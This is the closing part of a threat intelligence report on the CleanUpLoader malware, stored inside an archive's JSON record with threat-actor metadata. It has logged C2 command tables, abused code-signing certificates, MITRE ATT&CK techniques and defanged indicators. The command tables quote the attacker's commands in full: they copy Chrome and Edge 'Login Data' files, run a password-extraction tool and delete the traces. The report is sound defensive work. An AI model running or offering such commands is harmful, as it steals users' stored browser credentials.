\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\"|||\n\n\n33 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n|Col1|Col2|Col3|Col4|Col5|\"%localappdata%\\Temp\\Login Data\" & chrgetpdsi.exe 1 & de <truncated>|Col7|Col8|\n|---|---|---|---|---|---|---|---|\n|Command ID|11985|Type|1|||||\n|Command|copy \\\"%localappdata%\\\\Microsoft\\\\Edge\\\\U ser Data\\\\Local State\\\" \\\"%localappdata%\\\\Temp\\\\Local State\\\" & copy \\\"%localappdata%\\\\Microsoft\\\\Edge\\\\U ser Data\\\\Default\\\\Logn Data\\\" \\\"%localappdata%\\\\Temp\\\\Login Data\\\" & chrgetpdsi.exe 1 & del \\/f chrgetpdsi.exe & del \\/f \\\"Local State\\\" & del \\/f \\\"Login Data\\\" & type chrgetpdsi.txt & del \\/f chrgetpdsi.txt|||||||\n|||||Command ID|11985|ID|2995|\n|||||Session ID|2005|Status|4|\n|||||Result|copy \"%localappdata%\\Microsoft\\Edge\\User Data\\Local State\" \"%localappdata%\\Temp\\Local State\" & copy \"%localappdata%\\Microsoft\\Edge\\User Data\\Default\\Login Data\" \"%localappdata%\\Temp\\Login Data\" & chrgetpdsi.exe 1 & del /f chrgetq <truncated>|||\n|Command ID|11986|Type|1|||||\n\n\n34 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n|Command|exit|Col3|Col4|Col5|Col6|\n|---|---|---|---|---|---|\n|||Command ID|11986|ID|2995|\n|||Session ID|2005|Status|4|\n|||Result|ex<truncated>|||\n|status|delete|||||\n\n\n**_Table 12: CleanUpLoader C2 communication (Source: Recorded Future)_**\n\n35 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Appendix C: CleanUpLoader Valid Code Signing Certificates\n\n##### Shantou Chenghai Rongsheng Arts Company Ltd.\n```\n Version: 3 (0x02)\n Serial number: 25702517329757280089124628727 (0x530c9fc05d0b9d497263e8f7)\n Algorithm ID: SHA256withRSA\n Validity\n  Not Before: 02/02/2024 02:28:40 (dd-mm-yyyy hh:mm:ss) (240202022840Z)\n  Not After: 02/02/2025 02:28:40 (dd-mm-yyyy hh:mm:ss) (250202022840Z)\n Issuer\n  C = BE\n  O = GlobalSign nv-sa\n  CN = GlobalSign GCC R45 EV CodeSigning CA 2020\n Subject\n  businessCategory = Private Organization\n  serialNumber = 91440515324832161Q\n  jurisdictionOfIncorporationC = CN\n  jurisdictionOfIncorporationSP = Guangdong\n  jurisdictionOfIncorporationL = Shantou\n  C = CN\n  ST = Guangdong\n  L = Shantou\n  O = Shantou Chenghai Rongsheng Arts Company Ltd.\n  CN = Shantou Chenghai Rongsheng Arts Company Ltd.\n  E = jasonwang@xiongsteng.net\n Public Key\n  Algorithm: RSA\n  Length: 4096 bits\n  Modulus: e0:0d:61:63:f9:16:86:62:e0:18:fe:76:86:d2:1b:37:\n           da:a2:2f:00:28:05:e4:10:81:1e:bb:f8:9a:71:87:b2:\n           b1:59:92:87:11:88:68:46:76:a1:2e:94:29:65:59:fc:\n           41:a6:d0:37:ec:c2:e8:a9:7d:b8:2e:cf:22:c4:9d:29:\n           19:ee:6a:30:a3:77:5f:b7:53:ff:ec:a6:9a:1c:d9:01:\n           c0:b7:2b:c2:d0:a0:53:ac:9f:4e:02:d5:8f:bc:2b:36:\n           18:33:d8:5f:cd:16:39:c7:a3:8b:8e:70:f5:5e:bb:d7:\n           3b:bc:23:03:9f:f6:a4:a2:d7:dc:12:1f:df:37:63:4b:\n           e0:b9:59:f6:72:60:2b:4a:45:f3:b9:79:55:58:1f:c5:\n           2c:3a:c2:ff:16:c7:54:80:ec:48:96:60:83:e8:b5:05:\n           ba:f7:5f:7c:24:c5:c3:b6:93:ef:df:d7:68:e4:7f:37:\n           0e:9c:3b:cf:76:87:70:6c:e5:2f:80:d1:f1:9d:81:7c:\n           86:a6:0e:25:a0:2a:49:87:a7:7b:42:58:f8:05:5f:82:\n           22:96:88:79:04:df:3d:4c:79:aa:f9:9d:dd:94:72:29:\n           3e:ff:20:72:2d:27:e5:2c:3f:23:a5:ea:10:4a:23:5a:\n           03:56:4b:55:b6:1c:ce:c1:b5:27:f6:cd:d0:c0:15:bb:\n           88:a7:22:64:f5:f4:00:ef:a7:5e:ad:1a:00:ac:35:2f:\n           0d:b9:4d:43:5c:3a:25:84:1b:fb:a2:54:17:44:24:b8:\n           23:40:9b:3f:bc:93:54:2e:6f:c4:2a:6c:4e:bd:58:2c:\n           93:9a:89:9f:de:72:33:3f:9b:bd:b3:d6:f5:96:9c:5b:\n           90:fc:e2:41:12:69:7e:30:57:26:73:00:f2:3b:b5:a8:\n           89:b9:90:cd:dd:05:b9:a5:e1:74:24:04:52:5d:43:a5:\n           21:f7:51:fa:84:b2:74:0e:b4:3a:17:17:6b:af:2a:c5:\n           1f:aa:35:c2:93:f4:ab:5e:fd:9d:92:7f:f0:b7:ef:7a:\n           37:e5:90:39:03:b2:d6:eb:32:cf:a9:ad:69:35:f4:2b:\n           ac:60:17:9c:79:18:20:3a:75:3e:3a:b7:c9:38:d9:6d:\n           bc:44:ab:ac:19:70:de:c5:44:9a:0b:cb:99:47:26:a1:\n           61:cd:60:91:fc:43:d7:4c:0c:7c:cd:c2:0b:02:d7:c5:\n\n```\n36 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n37 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n##### Shanxi Yanghua HOME Furnishings Ltd\n```\n Version: 3 (0x02)\n Serial number: 4802475615069293750918753261 (0x0f8483c4c222876dd6c6abed)\n Algorithm ID: SHA256withRSA\n Validity\n  Not Before: 24/05/2024 09:06:38 (dd-mm-yyyy hh:mm:ss) (240524090638Z)\n  Not After: 25/05/2025 09:06:38 (dd-mm-yyyy hh:mm:ss) (250525090638Z)\n Issuer\n  C = BE\n  O = GlobalSign nv-sa\n  CN = GlobalSign GCC R45 EV CodeSigning CA 2020\n Subject\n  businessCategory = Private Organization\n  serialNumber = 91310114607545250A\n  jurisdictionOfIncorporationC = CN\n  jurisdictionOfIncorporationSP = Shanghai\n  C = CN\n  ST = Shanghai\n  L = Shanghai\n  O = Shanghai Lijin Chemical Technology Development Co., Ltd.\n  CN = Shanghai Lijin Chemical Technology Development Co., Ltd.\n Public Key\n  Algorithm: RSA\n  Length: 4096 bits\n  Modulus: cf:01:26:3f:dc:a4:df:1a:66:c2:ec:ca:b7:fd:c7:9d:\n           62:c0:4f:68:4a:f6:c5:5a:06:50:a8:03:e8:21:9d:60:\n           3c:bb:53:91:f5:fb:3e:b7:82:5c:b1:2d:06:51:f7:93:\n           b2:b5:8a:9e:75:97:24:27:98:fb:ef:ab:9f:85:d9:a5:\n           e1:29:2b:7d:b2:4f:08:25:4e:2e:07:cf:fb:bc:29:3c:\n           1c:57:19:e5:ca:4d:44:3c:bb:f7:1b:85:cc:f7:53:ec:\n           d4:49:61:ee:d2:9d:f2:1f:8f:db:26:a6:d4:11:8e:5d:\n           bb:da:45:f3:e9:a2:92:30:c6:fe:e3:57:b9:bb:0a:73:\n           58:d2:13:4f:7e:64:0a:27:16:18:76:4d:ae:85:60:3c:\n           44:a1:ff:9b:29:37:d4:d9:32:10:b2:89:26:9b:96:e6:\n           7b:18:ef:48:ee:5e:b8:c4:c3:4e:4a:a7:87:34:db:e2:\n           80:73:32:43:70:e0:05:86:1c:0d:29:e3:b3:c7:d0:b8:\n           db:2b:d0:44:bc:15:4a:71:82:52:5f:89:fc:43:dd:2a:\n           86:9e:5b:41:7d:56:2c:55:2f:97:b6:3d:39:8d:32:f6:\n           1a:31:16:c7:5c:83:c9:47:65:bc:01:1b:43:c4:df:4d:\n           ae:5e:db:92:9c:c2:1b:74:15:42:ba:ab:79:c7:83:cd:\n           6d:3d:ec:8a:e5:1e:68:58:8c:dd:2a:c0:6e:48:86:66:\n           1a:b8:2d:30:54:60:01:59:c9:5f:c4:c7:94:8f:60:bc:\n           3c:61:9e:f3:41:2f:b5:b4:09:8b:4a:04:d3:36:4b:8b:\n           72:7f:d1:4c:2f:5a:41:0f:6b:ca:0f:05:af:b7:34:f0:\n           e2:e8:75:bd:cd:10:14:59:e0:71:b0:e9:2f:71:07:a4:\n           f7:f4:91:78:ef:c1:f2:9b:c1:b1:75:87:91:75:43:01:\n           4f:25:6e:09:8c:83:e3:17:a9:d1:38:4d:1d:de:ee:a2:\n           e8:aa:bb:41:fc:36:74:91:63:0b:6c:44:a0:be:9d:ce:\n           cd:bb:37:18:12:30:9a:d1:0c:b9:1a:72:b9:86:4b:3c:\n           2a:e0:c3:52:db:6a:fa:e1:b3:b4:bb:2a:80:9f:e1:25:\n           3c:24:3e:fe:01:c3:9d:a9:ca:2d:eb:d3:e7:86:79:79:\n           5a:ac:75:9d:1e:f5:81:6a:a8:99:81:b6:db:34:d4:ae:\n           52:02:a7:0a:e1:61:ea:10:8c:c5:0d:6c:b1:74:79:5b:\n\n```\n38 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n39 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Appendix D: Mitre ATT&CK Techniques\n\n|Appendix D: Mitre ATT&CK Techniques|Col2|\n|---|---|\n|Tactic: Technique|ATT&CK Code|\n|Resource Development: Acquire Infrastructure: Domains|T1583.001|\n|Resource Development: Acquire Infrastructure: Virtual Private Server|T1583.003|\n|Resource Development: Acquire Infrastructure: Server|T1583.004|\n|Resource Development: Develop Capabilities: Malware|T1587.001|\n|Resource Development: Obtain Capabilities: Digital Certificates|T1588.004|\n|Initial Access: Phishing: Spearphishing Link|T1566.002|\n|Initial Access: Valid Accounts: Local Accounts|T1078.003|\n|Execution: Exploitation for Client Execution|T1203|\n|Execution: Command and Scripting Interpreter: PowerShell|T1059.001|\n|Execution: Scheduled Task/Job: Scheduled Task|T1053.005|\n|Execution: User Execution: Malicious File|T1204.002|\n|Persistence: Scheduled Task/Job: Scheduled Task|T1053.005|\n|Privilege Escalation: Exploitation for Privilege Escalation|T1068|\n|Exfiltration: Exfiltration Over C2 Channel|T1041|\n|Impact: Data Encrypted for Impact|T1486|\n\n\n**_Table 12: Mitre ATT&CK techniques observed (Source: Recorded Future)_**\n\n\n40 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n### Appendix E: Indicators of Compromise (IoCs)\n```\n Domains:\n aut0deskk[.]com\n autosdesk[.]net\n auttodessk[.]com\n backuppingplanseasy[.]com\n basiconlineincome[.]com\n buydotclearlynet[.]com\n codeforprofessionalusers[.]com\n connectivity-check[.]linkpc[.]net\n crystal-maker[.]com\n crystalmaker[.]pro\n docsfromthewest[.]com\n firscountryours[.]eu\n gang-force[.]com\n heartwithinadream[.]com\n itisthebestforyou[.]eu\n lakeshorehomebuilders[.]com\n metalforthecoredream[.]com\n microsoftt-teams-download[.]com\n microsoftt-teams[.]com\n microssoft-teams[.]com\n micrsoft-teams-download[.]com\n nnlcrosaftteams-download[.]pro\n ns-client[.]net\n pixalate[.]us\n postmastersoriginals[.]com\n prodfindfeatures[.]com\n retdirectyourman[.]eu\n supfoundrysettlers[.]us\n time-check-broker[.]com\n webex-up[.]com\n whereverhomebe[.]com\n yourserenahelpcustom[.]uk\n zoom-video[.]org\n IP Addresses:\n 45[.]61[.]136[.]48\n 45[.]61[.]136[.]85\n 45[.]61[.]136[.]244\n 45[.]66[.]248[.]78\n 51[.]195[.]232[.]46\n 64[.]94[.]84[.]61\n 64[.]95[.]10[.]243\n 64[.]95[.]13[.]77\n 64[.]95[.]13[.]98\n 67[.]217[.]228[.]11\n 67[.]217[.]228[.]136\n 67[.]217[.]228[.]171\n 91[.]240[.]118[.]215\n\n```\n41 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n42 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n43 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----\n\n_Recorded Future reporting contains expressions of likelihood or probability consistent_\n_[with US Intelligence Community Directive (ICD) 203: Analytic Standards (published](https://irp.fas.org/dni/icd/icd-203.pdf)_\n_January 2, 2015). Recorded Future reporting also uses confidence level standards_\n_[employed by the US Intelligence Community to assess the quality and quantity of the](https://www.dni.gov/files/ODNI/documents/assessments/ICA-declass-16MAR21.pdf)_\n_source information supporting our analytic judgments._\n\n_About Insikt Group[®]_\n\n_Recorded Future’s Insikt Group, the company’s threat research division, comprises_\n_analysts and security researchers with deep government, law enforcement, military, and_\n_intelligence agency experience. Their mission is to produce intelligence that reduces risk_\n_for clients, enables tangible outcomes, and prevents business disruption._\n\n_About Recorded Future[®]_\n\n_Recorded Future is the world’s largest threat intelligence company. Recorded Future’s_\n_Intelligence Cloud provides end-to-end intelligence across adversaries, infrastructure,_\n_and targets. Indexing the internet across the open web, dark web, and technical_\n_sources, Recorded Future provides real-time visibility into an expanding attack surface_\n_and threat landscape, empowering clients to act with speed and confidence to reduce_\n_risk and securely drive business forward. Headquartered in Boston with offices and_\n_employees around the world, Recorded Future works with over 1,800 businesses and_\n_government organizations across more than 75 countries to provide real-time, unbiased,_\n_and actionable intelligence._\n\n\n_Learn more at recordedfuture.com_\n\n44 CTA-2024-1009 Recorded Future[®] [| www.recordedfuture.com](http://www.recordedfuture.com)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://go.recordedfuture.com/hubfs/reports/cta-2024-1009.pdf"
    ],
    "report_names": [
        "cta-2024-1009.pdf"
    ],
    "threat_actors": [
        {
            "id": "77b28afd-8187-4917-a453-1d5a279cb5e4",
            "created_at": "2022-10-25T15:50:23.768278Z",
            "updated_at": "2025-03-27T02:00:55.5423Z",
            "deleted_at": null,
            "main_name": "Inception",
            "aliases": [
                "Inception Framework",
                "Cloud Atlas"
            ],
            "source_name": "MITRE:Inception",
            "tools": [
                "PowerShower",
                "VBShower",
                "LaZagne"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "63061658-5810-4f01-9620-7eada7e9ae2e",
            "created_at": "2022-10-25T15:50:23.752974Z",
            "updated_at": "2025-03-27T02:00:55.538582Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "Wizard Spider",
                "UNC1878",
                "TEMP.MixMaster",
                "Grim Spider",
                "FIN12",
                "GOLD BLACKBURN",
                "ITG23",
                "Periwinkle Tempest",
                "DEV-0193"
            ],
            "source_name": "MITRE:Wizard Spider",
            "tools": [
                "TrickBot",
                "AdFind",
                "BITSAdmin",
                "Bazar",
                "LaZagne",
                "Nltest",
                "GrimAgent",
                "Dyre",
                "Ryuk",
                "Conti",
                "Emotet",
                "Rubeus",
                "Mimikatz",
                "Diavol",
                "PsExec",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "84aa9dbe-e992-4dce-9d80-af3b2de058c0",
            "created_at": "2024-02-02T02:00:04.041676Z",
            "updated_at": "2025-03-27T02:00:03.297502Z",
            "deleted_at": null,
            "main_name": "Vanilla Tempest",
            "aliases": [
                "DEV-0832",
                "Vice Society"
            ],
            "source_name": "MISPGALAXY:Vanilla Tempest",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cf7fc640-acfe-41c4-9f3d-5515d53a3ffb",
            "created_at": "2023-01-06T13:46:38.228042Z",
            "updated_at": "2025-03-27T02:00:02.775905Z",
            "deleted_at": null,
            "main_name": "APT1",
            "aliases": [
                "GIF89a",
                "G0006",
                "PLA Unit 61398",
                "Group 3",
                "TG-8223",
                "Comment Group",
                "ShadyRAT",
                "COMMENT PANDA",
                "Comment Crew",
                "Byzantine Candor",
                "Brown Fox"
            ],
            "source_name": "MISPGALAXY:APT1",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e6a21528-2999-4e2e-aaf4-8b6af14e17f3",
            "created_at": "2022-10-25T16:07:24.422115Z",
            "updated_at": "2025-03-27T02:02:10.216817Z",
            "deleted_at": null,
            "main_name": "Wizard Spider",
            "aliases": [
                "DEV-0193",
                "Gold Blackburn",
                "Gold Ulrick",
                "Grim Spider",
                "ITG23",
                "Operation BazaFlix",
                "Periwinkle Tempest",
                "TEMP.MixMaster",
                "Wizard Spider"
            ],
            "source_name": "ETDA:Wizard Spider",
            "tools": [
                "AdFind",
                "Agentemis",
                "Anchor_DNS",
                "BEERBOT",
                "BazarBackdoor",
                "BazarCall",
                "BazarLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "Conti",
                "Diavol",
                "Dyranges",
                "Dyre",
                "Dyreza",
                "Dyzap",
                "Gophe",
                "Invoke-SMBAutoBrute",
                "KEGTAP",
                "LaZagne",
                "LightBot",
                "PowerSploit",
                "PowerTrick",
                "PsExec",
                "Ryuk",
                "SessionGopher",
                "TSPY_TRICKLOAD",
                "Team9Backdoor",
                "The Trick",
                "TheTrick",
                "Totbrick",
                "TrickBot",
                "TrickLoader",
                "TrickMo",
                "Upatre",
                "bazaloader",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bc119938-a79c-4e5f-9d4d-dc96835dfe2e",
            "created_at": "2024-06-04T02:03:07.799286Z",
            "updated_at": "2025-03-27T02:05:17.337094Z",
            "deleted_at": null,
            "main_name": "GOLD BLACKBURN",
            "aliases": [
                "Periwinkle Tempest ",
                "Wizard Spider ",
                "ITG23 "
            ],
            "source_name": "Secureworks:GOLD BLACKBURN",
            "tools": [
                " Buer Loader",
                " Dyre",
                " Team9",
                " TrickBot",
                "BazarLoader"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "600a0c3b-b595-4d10-b84b-cc2cf89289ac",
            "created_at": "2024-06-19T02:03:08.134296Z",
            "updated_at": "2025-03-27T02:05:17.402638Z",
            "deleted_at": null,
            "main_name": "GOLD VICTOR",
            "aliases": [
                "STAC5279 ",
                "Vanilla Tempest ",
                "Vice Society",
                "DEV-0832 "
            ],
            "source_name": "Secureworks:GOLD VICTOR",
            "tools": [
                " Advanced Port Scanner",
                " HelloKitty ransomware",
                " MEGAsync",
                " Neshta",
                " PAExec",
                " PSexec",
                " PortStarter",
                " SystemBC",
                " Zeppelin ransomware",
                "Advanced IP Scanner"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3aaf0755-5c9b-4612-9f0e-e266ef1bdb4b",
            "created_at": "2022-10-25T16:07:23.480196Z",
            "updated_at": "2025-03-27T02:02:09.826059Z",
            "deleted_at": null,
            "main_name": "Comment Crew",
            "aliases": [
                "APT 1",
                "BrownFox",
                "Byzantine Candor",
                "Byzantine Hades",
                "Comment Crew",
                "Comment Panda",
                "GIF89a",
                "Group 3",
                "Operation Oceansalt",
                "Operation Seasalt",
                "Operation Siesta",
                "Shanghai Group",
                "TG-8223"
            ],
            "source_name": "ETDA:Comment Crew",
            "tools": [
                "Auriga",
                "Cachedump",
                "Chymine",
                "CookieBag",
                "Darkmoon",
                "GDOCUPLOAD",
                "GLOOXMAIL",
                "GREENCAT",
                "Gen:Trojan.Heur.PT",
                "GetMail",
                "Hackfase",
                "Hacksfase",
                "Helauto",
                "Kurton",
                "LETSGO",
                "LIGHTBOLT",
                "LIGHTDART",
                "LOLBAS",
                "LOLBins",
                "LONGRUN",
                "Living off the Land",
                "Lslsass",
                "MAPIget",
                "ManItsMe",
                "Mimikatz",
                "MiniASP",
                "Oceansalt",
                "Pass-The-Hash Toolkit",
                "Poison Ivy",
                "ProcDump",
                "Riodrv",
                "SPIVY",
                "Seasalt",
                "ShadyRAT",
                "StarsyPound",
                "TROJAN.COOKIES",
                "TROJAN.FOXY",
                "TabMsgSQL",
                "Tarsip",
                "Trojan.GTALK",
                "WebC2",
                "WebC2-AdSpace",
                "WebC2-Ausov",
                "WebC2-Bolid",
                "WebC2-Cson",
                "WebC2-DIV",
                "WebC2-GreenCat",
                "WebC2-Head",
                "WebC2-Kt3",
                "WebC2-Qbp",
                "WebC2-Rave",
                "WebC2-Table",
                "WebC2-UGX",
                "WebC2-Yahoo",
                "Wordpress Bruteforcer",
                "bangat",
                "gsecdump",
                "pivy",
                "poisonivy",
                "pwdump",
                "zxdosml"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1731636326,
    "ts_updated_at": 1743041813,
    "ts_creation_date": 1728377110,
    "ts_modification_date": 1728377110,
    "files": {
        "pdf": "https://archive.orkl.eu/e772e781ce200df69cd7133edaca755e935bc3eb.pdf",
        "text": "https://archive.orkl.eu/e772e781ce200df69cd7133edaca755e935bc3eb.txt",
        "img": "https://archive.orkl.eu/e772e781ce200df69cd7133edaca755e935bc3eb.jpg"
    }
}